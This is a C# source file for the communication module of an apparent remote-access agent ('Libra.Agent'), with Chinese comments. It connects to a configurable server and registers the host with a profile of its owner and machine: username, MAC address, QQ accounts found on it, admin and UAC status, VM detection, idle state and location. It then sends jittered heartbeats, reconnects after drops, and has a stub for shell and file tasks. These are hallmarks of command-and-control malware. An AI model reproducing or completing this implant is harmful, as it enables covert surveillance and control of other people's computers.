using Libra.Agent.Models;
using Libra.Agent.Models.Module;
using System.Net.Sockets;
using System.Text;
using System.Text.Json;
using System.Text.Json.Serialization.Metadata;

namespace Libra.Agent.Service
{
    public class CommunicationService : IDisposable
    {
        private TcpClient _tcpClient;
        private NetworkStream _networkStream;
        private readonly string _agentId;
        private readonly string _serverIp;
        private readonly int _serverPort;
        private readonly Random _random = new();
        private bool _isConnected;
        private bool _isRegistered;

        public event EventHandler Connected;
        public event EventHandler Disconnected;
        public event EventHandler Registered;
        public event EventHandler RegistrationFailed;

        public bool IsConnected => _isConnected && (_tcpClient?.Connected ?? false);
        public bool IsRegistered => _isRegistered;

        public CommunicationService(string agentId, string serverIp = "127.0.0.1", int serverPort = 8888)
        {
            _agentId = agentId;
            _serverIp = serverIp;
            _serverPort = serverPort;
            _isConnected = false;
            _isRegistered = false;
            _tcpClient = null;
            _networkStream = null;
        }

        /// <summary>
        /// 初始化连接
        /// </summary>
        public async Task InitializeAsync(CancellationToken ct)
        {
            try
            {
                // 连接到服务器
                _tcpClient = new TcpClient();
                await _tcpClient.ConnectAsync(_serverIp, _serverPort, ct);
                _networkStream = _tcpClient.GetStream();
                _isConnected = true;

                // 触发连接事件
                Connected?.Invoke(this, EventArgs.Empty);
                Console.WriteLine($"已连接到服务器 {_serverIp}:{_serverPort}");

                var city = await InfoHelper.GetCity();
                var cpuInfo = InfoHelper.GetCpuInfo();
                var memoryInfo = InfoHelper.GetPhysicalMemory();
                var gpuInfo = InfoHelper.GetGpuNames();
                var diskInfo = InfoHelper.Drives();
                var bootTime = InfoHelper.GetBootTime();
                var lastActiveTime = InfoHelper.GetLastActiveTime();
                var isIdle = InfoHelper.IsIdle();
                var uacStatus = InfoHelper.GetUacStatus();
                var vmInfo = InfoHelper.GetVirtualMachineInfo();

                // 创建带有正确嵌套结构的 AgentInfo
                var agentInfo = new AgentInfo
                {
                    AgentId = Guid.Parse(_agentId),
                    ProcessName = System.Diagnostics.Process.GetCurrentProcess().ProcessName,
                    OsVersion = InfoHelper.GetSystemVersion(),
                    QQAccounts = [.. InfoHelper.GetQQList()],
                    Network = new NetworkEndpoint
                    {
                        MacAddress = GetMacAddress(),
                        Hostname = Environment.MachineName,
                        Username = Environment.UserName
                    },
                    Privilege = new PrivilegeInfo 
                    {
                        IsAdmin = IsRunningAsAdmin(),
                        UacEnabled = uacStatus
                    },
                    LastHeartbeat = DateTime.UtcNow,
                    StartTime = DateTime.Now,
                    BootTime = bootTime,
                    LastActiveTime = lastActiveTime,
                    IsIdle = isIdle,
                    Location = city.country + " " + city.city.Replace("’","'"),
                    Hardware = new HardwareInfo
                    {
                        Cpu = cpuInfo,
                        Memory = memoryInfo,
                        Gpus = gpuInfo,
                        Disks = diskInfo,
                        IsVirtualMachine = vmInfo.IsVirtualMachine,
                        VmType = vmInfo.VmType
                    }
                };

                // 使用 AOT 支持将 AgentInfo 序列化为 JSON
                var options = new JsonSerializerOptions
                {
                    TypeInfoResolver = new DefaultJsonTypeInfoResolver()
                };
                string registrationData = JsonSerializer.Serialize(agentInfo, options);
                byte[] registrationBytes = Encoding.UTF8.GetBytes(registrationData);

                // 发送注册数据
                await _networkStream.WriteAsync(registrationBytes, 0, registrationBytes.Length, ct);
                await _networkStream.FlushAsync(ct);
                Console.WriteLine("已发送注册数据");

                // 等待注册响应（可选）
                byte[] buffer = new byte[4096];
                int bytesRead = await _networkStream.ReadAsync(buffer, 0, buffer.Length, ct);
                if (bytesRead > 0)
                {
                    string response = Encoding.UTF8.GetString(buffer, 0, bytesRead);
                    Console.WriteLine($"收到响应: {response}");
                }

                _isRegistered = true;
                Registered?.Invoke(this, EventArgs.Empty);
                Console.WriteLine("注册成功");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"初始化过程中出错: {ex.Message}");
                _isConnected = false;
                _isRegistered = false;
                RegistrationFailed?.Invoke(this, EventArgs.Empty);
                Dispose();
                throw;
            }
        }

        /// <summary>
        /// 发送消息并接收响应 (TCP 方法)
        /// </summary>
        public async Task<TResponse> SendAsync<TRequest, TResponse>(TRequest requestData, int messageType, CancellationToken ct)
        {
            if (!IsConnected)
            {
                throw new InvalidOperationException("未连接到服务器");
            }

            try
            {
                // 使用 AOT 支持序列化请求数据 
                var serializeOptions = new JsonSerializerOptions
                {
                    TypeInfoResolver = new DefaultJsonTypeInfoResolver()
                };
                string requestJson = JsonSerializer.Serialize(requestData, serializeOptions);
                byte[] requestBytes = Encoding.UTF8.GetBytes(requestJson);

                // 发送数据
                await _networkStream.WriteAsync(requestBytes, 0, requestBytes.Length, ct);
                await _networkStream.FlushAsync(ct);

                // 接收响应
                byte[] buffer = new byte[4096];
                int bytesRead = await _networkStream.ReadAsync(buffer, 0, buffer.Length, ct);
                if (bytesRead == 0)
                {
                    throw new IOException("服务器已断开连接");
                }

                // 使用 AOT 支持解析响应
                string responseJson = Encoding.UTF8.GetString(buffer, 0, bytesRead);
                var options = new JsonSerializerOptions
                {
                    TypeInfoResolver = new DefaultJsonTypeInfoResolver()
                };
                TResponse response = JsonSerializer.Deserialize<TResponse>(responseJson, options) ?? throw new InvalidOperationException("反序列化响应失败");

                return response;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"发送消息出错: {ex.Message}");
                _isConnected = false;
                Disconnected?.Invoke(this, EventArgs.Empty);
                Dispose();
                throw;
            }
        }

        /// <summary>
        /// 主循环：心跳 + 任务轮询
        /// </summary>
        public async Task StartLoopAsync(CancellationToken ct)
        {
            while (!ct.IsCancellationRequested)
            {
                try
                {
                    if (IsConnected)
                    {
                        // 发送心跳
                        var heartbeatReq = new { Status = "alive", Timestamp = DateTimeOffset.UtcNow.ToUnixTimeSeconds() };
                        await SendAsync<object, object>(heartbeatReq, 1, ct);
                        Console.WriteLine("已发送心跳");

                        // 随机休眠
                        int sleepTime = 30000 + _random.Next(0, 10000);
                        await Task.Delay(sleepTime, ct);
                    }
                    else
                    {
                        // 如果断开连接则重新连接
                        Console.WriteLine("已从服务器断开连接，将在 30 秒后尝试重新连接...");
                        await Task.Delay(30000, ct);
                        try
                        {
                            await InitializeAsync(ct);
                            Console.WriteLine("重新连接成功");
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine($"重新连接失败: {ex.Message}");
                        }
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"主循环出错: {ex.Message}");
                    _isConnected = false;
                    _isRegistered = false;
                    Disconnected?.Invoke(this, EventArgs.Empty);
                    Dispose();

                    // 异常退避策略
                    await Task.Delay(60000, ct);
                }
            }
        }

        private Task ExecuteTaskAsync(object taskData, CancellationToken ct)
        {
            // 任务执行逻辑（Shell、File 等）
            return Task.CompletedTask;
        }

        private bool IsRunningAsAdmin()
        {
            try
            {
                var identity = System.Security.Principal.WindowsIdentity.GetCurrent();
                var principal = new System.Security.Principal.WindowsPrincipal(identity);
                return principal.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
            }
            catch
            {
                return false;
            }
        }

        private string GetMacAddress()
        {
            try
            {
                var networkInterfaces = System.Net.NetworkInformation.NetworkInterface.GetAllNetworkInterfaces();
                var ethernetInterface = networkInterfaces.FirstOrDefault(nic => 
                    nic.OperationalStatus == System.Net.NetworkInformation.OperationalStatus.Up &&
                    nic.NetworkInterfaceType == System.Net.NetworkInformation.NetworkInterfaceType.Ethernet);
                
                if (ethernetInterface != null)
                {
                    return BitConverter.ToString(ethernetInterface.GetPhysicalAddress().GetAddressBytes()).Replace("-", ":");
                }
                return "00:00:00:00:00:00";
            }
            catch
            {
                return "00:00:00:00:00:00";
            }
        }

        public void Dispose()
        {
            _networkStream?.Dispose();
            _tcpClient?.Dispose();
            _isConnected = false;
            _isRegistered = false;
        }
    }
}
